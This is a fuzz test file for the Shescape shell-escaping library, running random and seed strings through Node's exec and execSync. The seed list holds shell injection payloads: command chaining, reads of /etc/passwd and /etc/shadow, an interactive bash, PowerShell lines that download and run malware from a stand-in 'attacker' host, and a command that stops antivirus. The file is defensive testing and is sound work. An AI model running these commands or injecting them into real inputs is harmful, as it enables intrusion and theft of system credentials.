/**
 * @overview Contains fuzz tests for using Shescape with the child_process
 * function `exec` / `execSync`.
 * @license MIT
 */

import { testProp } from "@fast-check/ava";
import test from "ava";
import fc from "fast-check";

import { common, runners } from "./_.js";

fc.configureGlobal({
  numRuns: common.getIterations(),
  timeout: 10_000,
});

test("prerequisites", (t) => {
  const shell = common.getFuzzShell();
  t.not(shell, false, "Fuzzing exec requires a shell");
});

testProp(
  "fuzz",
  [fc.string()],
  async (t, arg) => {
    const shell = common.getFuzzShell();

    try {
      await runners.execQuote({ arg, shell });
      await runners.execEscape({ arg, shell });
      runners.execSyncQuote({ arg, shell });
      runners.execSyncEscape({ arg, shell });

      t.pass();
    } catch (error) {
      common.extendCorpus(arg);
      t.fail(`${error}`);
    }
  },
  {
    examples: [
      ...common.corpus(),
      ["; ls -la"],
      ["&& id"],
      ["\ncat /etc/passwd"],
      ["$(uname -a)"],
      ["`hostname`"],
      ["> /var/www/html/output.txt"],
      ["< /etc/shadow"],
      ["(sleep 5)"],
      ["{/bin/bash,-i}"],
      ["~/../../etc/passwd"],
      ["& whoami"],
      ["&& dir c:\\"],
      ["& ipconfig /all &"],
      ["%USERNAME%"],
      ["; Get-LocalUser"],
      ["$(Get-Process)"],
      ["(New-Object System.Net.WebClient).DownloadFile('http://attacker/malware.exe', 'C:\\Users\\Public\\malware.exe')"],
      ["iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"],
      ["Stop-Process -Name \"antivirus\""],
    ],
  },
);
